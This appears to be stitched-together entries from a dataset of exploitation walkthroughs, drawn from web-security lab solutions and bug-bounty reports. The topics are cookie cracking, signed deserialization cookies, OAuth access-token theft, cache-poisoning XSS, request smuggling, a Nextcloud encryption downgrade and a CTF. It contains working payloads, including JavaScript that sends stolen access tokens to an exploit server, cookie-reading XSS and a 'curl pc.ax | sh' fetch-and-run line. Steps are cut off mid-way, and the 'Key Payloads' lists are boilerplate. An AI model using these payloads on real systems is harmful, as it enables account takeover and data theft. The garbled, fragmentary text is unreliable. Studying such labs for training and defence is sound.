With Burp running, log in to your own account with the Stay logged in option selected. Notice that this sets a stay-logged-in cookie.\n2. Examine this cookie in the Inspector panel and notice that it is Base64-encoded. Its decoded value is wiener:51dc30ddc473d43a6011e9ebba6ca770 . Study the length and character set of this string and notice that it could be an MD5 hash. Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows: base64(username+':'+md5HashOfPassword)\n3. Log out of your account.\n4. In the most recent GET /my-account?id=wiener request highlight the stay-logged-in cookie parameter and send the request to Burp Intruder.\n5.

You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes: Assign the object you generated in PHPGGC to the $object variable. Assign the secret key that you copied from the phpinfo.php file to the $secretKey variable. <?php\n$object = \"OBJECT-GENERATED-BY-PHPGGC\";\n$secretKey = \"LEAKED-SECRET-KEY-FROM-PHPINFO.PHP\";\n$cookie = urlencode('{\"token\":\"' . $object . '\",\"sig_hmac_sha1\":\"' . hash_hmac('sha1', $object, $secretKey) . '\"}');\necho $cookie; This will output a valid, signed cookie to the console.\n9.

Log in with the \"Stay logged in\" option enabled and post a comment. Study the corresponding requests and responses using Burp's manual testing tools. Observe that the stay-logged-in cookie is encrypted.\n2. Notice that when you try and submit a comment using an invalid email address, the response sets an encrypted notification cookie before redirecting you to the blog post.\n3. Notice that the error message reflects your input from the email parameter in cleartext: Invalid email address: your-invalid-email Deduce that this must be decrypted from the notification cookie. Send the POST /post/comment and the subsequent GET /post?postId=x request (containing the notification cookie) to Burp Repeater.\n4. In Repeater, observe that you can use the email parameter of the POST request to encrypt arbitrary data and reflect the corresponding ciphertext in the Set-Cookie header. Likewise, you can use the notification cookie in the GET request to decrypt arbitrary ciphertext and reflect the output in the error message. For simplicity, double-click the tab for each request and rename the tabs encrypt and decrypt respectively.\n5. In the decrypt request, copy your stay-logged-in cookie and paste it into the notification cookie. Send the request. Instead of the error message, the response now contains the decrypted stay-logged-in cookie, for example: wiener:1598530205184 This reveals that the cookie should be in the format username:timestamp . Copy the timestamp to your clipboard.\n6. Go to the encrypt request and change the email parameter to administrator:your-timestamp .

Select the first 23 bytes, then right-click and select \"Delete selected bytes\".\n10. Re-encode the data and copy the result into the notification cookie of the decrypt request. When you send the request, observe that an error message indicates that a block-based encryption algorithm is used and that the input length must be a multiple of 16. You need to pad the \" Invalid email address: \" prefix with enough bytes so that the number of bytes you will remove is a multiple of 16.\n11. In Burp Repeater, go back to the encrypt request and add 9 characters to the start of the intended cookie value, for example: xxxxxxxxxadministrator:your-timestamp Encrypt this input and use the decrypt request to test that it can be successfully decrypted.\n12. Send the new ciphertext to Decoder, then URL and Base64-decode it. This time, delete 32 bytes from the start of the data. Re-encode the data and paste it into the notification parameter in the decrypt request. Check the response to confirm that your input was successfully decrypted and, crucially, no longer contains the \" Invalid email address: \" prefix. You should only see administrator:your-timestamp .\n13. From the proxy history, send the GET / request to Burp Repeater.

While proxying traffic through Burp, click \"My account\" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.\n2. Study the resulting requests and responses. Notice that the blog website makes an API call to the userinfo endpoint at /me and then uses the data it fetches to log the user in. Send the GET /me request to Burp Repeater.\n3. Log out of your account and log back in again. From the proxy history, find the most recent GET /auth?client_id=[...] request and send it to Repeater.\n4. In Repeater, experiment with the GET /auth?client_id=[...] request. Observe that you cannot supply an external domain as redirect_uri because it's being validated against a whitelist. However, you can append additional characters to the default value without encountering an error, including the /../ path traversal sequence.\n5. Log out of your account on the blog website and turn on proxy interception in Burp.\n6. In the browser, log in again and go to the intercepted GET /auth?client_id=[...] request in Burp Proxy.\n7. Confirm that the redirect_uri parameter is in fact vulnerable to directory traversal by changing it to: https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1 Forward any remaining requests and observe that you are eventually redirected to the first blog post. In the browser, notice that your access token is included in the URL as a fragment.\n8. With the help of Burp, audit the other pages on the blog website. Identify the \"Next post\" option at the bottom of each blog post, which works by redirecting users to the path specified in a query parameter. Send the corresponding GET /post/next?path=[...] request to Repeater.\n9. In Repeater, experiment with the path parameter. Notice that this is an open redirect. You can even supply an absolute URL to elicit a redirect to a completely different domain, for example, your exploit server.\n10. Craft a malicious URL that combines these vulnerabilities. You need a URL that will initiate an OAuth flow with the redirect_uri pointing to the open redirect, which subsequently forwards the victim to your exploit server: https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email\n11. Test that this URL works correctly by visiting it in the browser. You should be redirected to the exploit server's \"Hello, world!\" page, along with the access token in a URL fragment.\n12. On the exploit server, create a suitable script at /exploit that will extract the fragment and output it somewhere. For example, the following script will leak it via the access log by redirecting users to the exploit server for a second time, with the access token as a query parameter instead: <script>\nwindow.location = '/?'+document.location.hash.substr(1)\n</script>\n13. To test that everything is working correctly, store this exploit and visit your malicious URL again in the browser. Then, go to the exploit server access log. There should be a request for GET /?access_token=[...] .\n14. You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. For example: <script>\n    if (!document.location.hash) {\n        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'\n    } else {\n        window.location = '/?'+document.location.hash.substr(1)\n    }\n</script>\n15. To test that the exploit works, store it and then click \"View exploit\". The page should appear to refresh, but if you check the access log, you should see a new request for GET /?access_token=[...] .\n16. Deliver the exploit to the victim, then copy their access token from the log.\n17. In Repeater, go to the GET /me request and replace the token in the Authorization: Bearer header with the one you just copied. Send the request.

From the proxy history, check the Content-Length in the response to a normal GET / request and make a note of its value.

Send the request and confirm that your payload is successfully reflected in the tunnelled response. If you still encounter a timeout, you may not have added enough padding.\n10. While the cache is still poisoned, visit the home page using the same cachebuster query parameter and confirm that the alert() fires.\n11.

In Burp Repeater, try issuing a request for a valid directory without including a trailing slash, for example, GET /resources . Observe that you are redirected to /resources/ .\n3. Right-click the request and select Extensions > Turbo Intruder > Send to Turbo Intruder .\n4. In Turbo Intruder, convert the request to a POST request (right-click and select Change request method ).\n5. Change the Connection header to keep-alive .\n6. Add a complete GET /admin request to the body of the main request. The result should look something like this: POST /resources HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION-COOKIE\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: CORRECT\n\nGET /admin/ HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\n7. In the Python editor panel, enter the following script. This issues the request twice, pausing for 61 seconds after the \\r\\n\\r\\n sequence at the end of the headers: def queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=1,\n                           requestsPerConnection=500,\n                           pipeline=False\n                           )\n\n    engine.queue(target.req, pauseMarker=['\\r\\n\\r\\n'], pauseTime=61000)\n    engine.queue(target.req)\n\ndef handleResponse(req, interesting):\n    table.add(req)\n8. Launch the attack. Initially, you won't see anything happening, but after 61 seconds, you should see two entries in the results table: The first entry is the POST /resources request, which triggered a redirect to /resources/ as normal. The second entry is a response to the GET /admin/ request. Although this just tells you that the admin panel is only accessible to local users, this confirms the pause-based CL.0 vulnerability.\n\n### Key Payloads\n- `/admin`\n- `carlos`\n- `Server`\n- `Apache 2.4.52`\n- `GET /resources`\n- `/resources/`\n- `POST`\n- `Connection`\n- `keep-alive`\n- `GET /admin`\n\n### Success Indicators\n- Request desync between front/back-end\n- Subsequent request poisoned\n- Other user's request captured\n- Cache poisoned via smuggling\n- Access controls bypassed"}]}

With Burp running, load the website's home page.\n2. Use Param Miner to identify that the X-Forwarded-Host and X-Original-URL headers are supported.\n3. In Burp Repeater, experiment with the X-Forwarded-Host header and observe that it can be used to import an arbitrary JSON file instead of the translations.json file, which contains translations of UI texts.\n4. Notice that the website is vulnerable to DOM-XSS due to the way the initTranslations() function handles data from the JSON file for all languages except English.\n5. Go to the exploit server and edit the file name to match the path used by the vulnerable website: /resources/json/translations.json\n6. In the head, add the header Access-Control-Allow-Origin: * to enable CORS .\n7. In the body, add malicious JSON that matches the structure used by the real translation file. Replace the value of one of the translations with a suitable XSS payload, for example: {\n    \"en\": {\n        \"name\": \"English\"\n    },\n    \"es\": {\n        \"name\": \"espa\u00f1ol\",\n        \"translations\": {\n            \"Return to list\": \"Volver a la lista\",\n            \"View details\": \"</a><img src=1 onerror='alert(document.cookie)' />\",\n            \"Description:\": \"Descripci\u00f3n\"\n        }\n    }\n} For the rest of this solution we will use Spanish to demonstrate the attack. Please note that if you injected your payload into the translation for another language, you will also need to adapt the examples accordingly.\n8. Store the exploit.\n9. In Burp, find a GET request for /?localized=1 that includes the lang cookie for Spanish: lang=es\n10. Send the request to Burp Repeater. Add a cache buster and the following header, remembering to enter your own exploit server ID: X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net\n11. Send the response and confirm that your exploit server is reflected in the response.\n12. To simulate the victim, load the URL in the browser and confirm that the alert() fires.\n13. You have successfully poisoned the cache for the Spanish page, but the target user's language is set to English. As it's not possible to exploit users with their language set to English, you need to find a way to forcibly change their language.\n14. In Burp, go to \"Proxy\" > \"HTTP history\" and study the requests and responses that you generated. Notice that when you change the language on the page to anything other than English, this triggers a redirect, for example, to /setlang/es . The user's selected language is set server side using the lang=es cookie, and the home page is reloaded with the parameter ?localized=1 .\n15. Send the GET request for the home page to Burp Repeater and add a cache buster.\n16. Observe that the X-Original-URL can be used to change the path of the request, so you can explicitly set /setlang/es . However, you will find that this response cannot be cached because it contains the Set-Cookie header.\n17. Observe that the home page sometimes uses backslashes as a folder separator. Notice that the server normalizes these to forward slashes using a redirect. Therefore, X-Original-URL: /setlang\\es triggers a 302 response that redirects to /setlang/es . Observe that this 302 response is cacheable and, therefore, can be used to force other users to the Spanish version of the home page.\n18. You now need to combine these two exploits. First, poison the GET /?localized=1 page using the X-Forwarded-Host header to import your malicious JSON file from the exploit server.\n19. Now, while the cache is still poisoned, also poison the GET / page using X-Original-URL: /setlang\\es to force all users to the Spanish page.\n20. To simulate the victim, load the English page in the browser and make sure that you are redirected and that the alert() fires.\n21.

I've found that it's more consistent after adding a random sleep after the unlock here https://github.com/curl/curl/blob/master/lib/url.c#L1372.\n\nA colleague suggested that a potential fix could be to remove the CONN_INUSE check from [this condition ](https://github.com/curl/curl/blob/master/lib/url.c#L1194) because the connection isn't actually marked as inuse until a different set of lock and unlocks.

Indicators that confirm successful exploitation"}, {"role": "assistant", "content": "## Exploitation Methodology:  SSL cookie without secure flag set\n\n### Step-by-Step Exploitation\nIssue background\nIf the secure flag is set on a cookie, then browsers will not submit the cookie in any requests that use an unencrypted HTTP connection, thereby preventing the cookie from being trivially intercepted by an attacker monitoring network traffic. If the secure flag is not set, then the cookie will be transmitted in clear-text if the user visits any HTTP URLs within the cookie's scope. An attacker may be able to induce this event by feeding a user suitable links, either directly or via another web site. Even if the domain that issued the cookie does not host any content that is accessed over HTTP, an attacker may be able to use links of the form http://example.com:443/ to perform the same attack.\nTo exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.\nIssue remediation\nThe secure flag should be set on all cookies that are used for transmitting sensitive data when accessing content over HTTPS. If cookies are used to transmit session tokens, then areas of the application that are accessed over HTTPS should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications.\n\n## Impact\n\nAn attacker may be able to induce this event by feeding a user suitable links, either directly or via another web site.

Some time ago, Nextcloud switched from unauthenticated CFB cipher block mode to authenticated CTR cipher block mode in an Encrypt-then-MAC scheme. However, backends compatibility has been maintained while downgrade attacks have been prevented on new files that use the CTR cipher block mode [1].\n\nThere is, however, one attack vector that has not been taken into account. CFB/OFB and CTR generate the same keystream for the first round, creating the possibility for a known-plaintext attack to extract the first bytes of the keystream. Furthermore, the downgrade attack only prevents files from not having a \"signature\" (HMAC) when their file header contain a CTR cipher.  A downgrade is still possible when another mode like CFB/OFB is given in the file header.\n\nBecause of these two vulnerabilities, a downgrade attack in conjunction with a known-plaintext attack can be leveraged to break the integrity of files encrypted with Encrypt-then-MAC encryption scheme of Nextcloud using the newer AES-256-CTR cipher.\n\n### Key Payloads\n- `strip-signature.php`\n- `AES-256-CTR`\n- `AES-256-CFB`\n- `#!/bin/bash\\n`\n- `#!/usr/bin/env python\\n`\n- `inject-content.php`\n- `curl pc.ax | sh\\n`\n- `https://github.com/nextcloud/server/blob/a374d8837d6de459500e619cf608e0721ea14574/apps/encryption/lib/Crypto/Crypt.php#L571`\n- `https://github.com/syseleven/nextcloud-tools/blob/master/strip-signature.php`\n- `https://github.com/syseleven/nextcloud-tools/blob/master/inject-content.php`\n\n### Success Indicators\n- Vulnerability successfully exploited\n- Unauthorized access achieved\n- Application behavior confirms issue"}]}

Oftentimes it will just be `1` or you can denote the number of previous versions thanks to the default versioning plugin that stores old versions on disk as well. An external storage provider will have the possibility to know the version of a certain file by counting the write accesses to encrypted files. **But** you can also just use the previously supported AES-256-CFB encryption which allows you to just skip the \"signing\" of the file.\nHow to do this:\n* Generate a fresh file key (e.g. with `openssl rand -hex 32`)\n* Generate a fresh envelope key (e.g. with `openssl rand -hex 16`)\n* Encrypt the file key with the envelope key (e.g. with `encrypt-filekey.php` [1]) and replace the original `fileKey` file of the file you want to attack with the newly generated file\n* Encrypt the envelope key with all public keys (they're stored as plain PEM-encoded keys on disk) that have currently access to the file (e.g. with `encrypt-envelopekey.php` [2]) and replace the corresponding `<username>.shareKey` files with the newly generated files\n* Take the file that you want to modify and calculate its unencrypted file size (e.g. with `calculate-filesize.php` [3])\n* Prepare a file with the same size and encrypt it for the newly generated file key (e.g. with `encrypt-file.php` [4]). If you use the AES-256-CTR encryption, then you have to know the version number of the file  or you can just use the AES-256-CFB encryption which doesn't require you to know the version number of the file (see **optional** prerequisite).\n\n### Key Payloads\n- `1`\n- `openssl rand -hex 32`\n- `openssl rand -hex 16`\n- `encrypt-filekey.php`\n- `fileKey`\n- `encrypt-envelopekey.php`\n- `<username>.shareKey`\n- `calculate-filesize.php`\n- `encrypt-file.php`\n- `https://hackerone.com/bugs?subject=user&report_id=732431)`\n\n### Success Indicators\n- Vulnerability successfully exploited\n- Unauthorized access achieved\n- Application behavior confirms issue"}]}

In this configuration, an attacker able to run a process as root in a container can send and receive arbitrary packets to the host using the CAP_NET_RAW capability (present in default configuration).\n\nIn a K8S cluster with an IPv4 internal network, if IPv6 is not totally disabled on the host (via ipv6.disable=1 on the kernel cmdline), it will be either unconfigured or configured on some interfaces, but it\u2019s pretty likely that ipv6 forwarding is disabled, ie /proc/sys/net/ipv6/conf/*/forwarding == 0. Also by default, /proc/sys/net/ipv6/conf/*/accept_ra == 1. The combination of these 2 sysctls means that the host accepts router advertisements and configure the IPv6 stack using them.\n\n### Key Payloads\n- `--enable-ip-alias`\n- `https://github.com/containernetworking/plugins)`\n- `https://github.com/smoltcp-rs/smoltcp)`\n- `https://github.com/asciinema/asciinema)`\n- `https://www.googleapis.com/auth/devstorage.read_only`\n- `https://www.googleapis.com/auth/logging.write`\n\n### Success Indicators\n- Vulnerability successfully exploited\n- Unauthorized access achieved\n- Application behavior confirms issue"}]}

Indicators that confirm successful exploitation"}, {"role": "assistant", "content": "## Exploitation Methodology: [H1-2006] CTF Writeup\n\n### Step-by-Step Exploitation\n---------------------------------------\n**For those impatient, here is a condensed walk-through of the CTF. If you're here after the long writeup, you can safely skip this part.**.\n1. Subdomain enumeration yields several subdomains: `app.bountypay.h1ctf.com` (customer portal with username/password login), `staff.bountypay.h1ctf.com` (staff portal with username/password login), `api.bountypay.h1ctf.com`, `software.bountypay.h1ctf.com`(denies access from public IPs).\n2. Content discovery on `app.bountypay.h1ctf.com` reveals `/.git/config` which references GitHub repo at [https://github.com/bounty-pay-code/request-logger.git](https://github.com/bounty-pay-code/request-logger.git)\n3. Source code in the repo exposes the presence of [`/bp_web_trace.log`](http://app.bountypay.h1ctf.com/bp_web_trace.log) file, which gives us three things:\n*  Log file gives us `username` and `password` for authentication on the customer portal, `app.bountypay.h1ctf.com`. Using these credentials we're presented with 2FA challenge. On every access It gives us a random `challenge` (md5 hash) that we need to guess a valid `challenge_answer` for.\n* Log file also gives us a `challenge_answer` (for the past login attempt), but no `challenge` itself. The solution is that `challenge` is simply an md5 hash of the `challenge_answer`, and there is nothing preventing the re-use of the old challenge, so we compute md5 hash of that `challenge_answer` and use this pair to login.\n* Last thing the log file gives us is the following endpoint: `GET /statements?month=04&year=2020`\n4. Authentication cookie is base64-encoded JSON such as `{\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}`, where `hash` is the actual session, while `account_id` can be freely tampered with.\n5. The `/statements` endpoint above reveals that it makes a server-side request to `https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=04&year=2020`.  When accessed directly, the API endpoint responds with 401 `[\"Missing or invalid Token\"]`. Observe the same account id value, `F8gHiqSdpK`, within the request path- which is in fact taken from `account_id` of the session cookie and interpolated into request path without any sanitization. By changing `account_id` within our authentication cookie we can thus achieve SSRF via Path Traversal - but for now only on same host.\n6. Front page on `api.bountypay.h1ctf.com` reveals an endpoint that allows a redirect: `https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API`. It uses a whitelist and does not appear to allow an Open Redirect, but several BountyPay subdomains are whitelisted, including `software.bountypay.h1ctf.com`.\n7.  Content discovery on `software.bountypay.h1ctf.com` via SSRF with the aforementioned redirect (which bypasses IP restriction) reveals `/uploads` folder with Directory Listing enabled. The only file within it, [`BountyPay.apk`](http://software.bountypay.h1ctf.com/uploads/BountyPay.apk), can be downloaded directly from a public IP.\n8. APK interacts with a Firebase instance and presents a series of screens that eventually lead to obtaining a header name (`X-Token`), a header value (`8e9998ee3137ca9ade8f372739f062c1`) and a host name (`api.bountypay.h1ctf.com`). One way those could be obtained is by decompiling the code and following the designed challenges, which involve sending [deep links](https://developer.android.com/training/app-links/deep-linking) to the app. The data of interest could either be intercepted with a proxy, or retrieved  from `/shared_prefs/user_created.xml` with `adb`. Or alternatively one could also have interacted with Firebase directly, using the credentials that are located in `res/values/strings.xml`.\n9. `X-Token: 8e9998ee3137ca9ade8f372739f062c1` allows us to make API calls directly on `api.bountypay.h1ctf.com` without SSRF - including `POST` calls that we could not do before. Content discovery on the `/api` directory reveals `/api/staff` endpoint.\n* `GET` request returns some JSON data for a couple of staff members, which includes `staff_id`field with values like `STF:KE624RQ2T9`.\n\n### Key Payloads\n- `app.bountypay.h1ctf.com`\n- `staff.bountypay.h1ctf.com`\n- `api.bountypay.h1ctf.com`\n- `software.bountypay.h1ctf.com`\n- `app.bountypay.h1ctf.com`\n- `/.git/config`\n- `/bp_web_trace.log`\n- `username`\n- `password`\n- `app.bountypay.h1ctf.com`\n\n### Success Indicators\n- Vulnerability successfully exploited\n- Unauthorized access achieved\n- Application behavior confirms issue"}]}
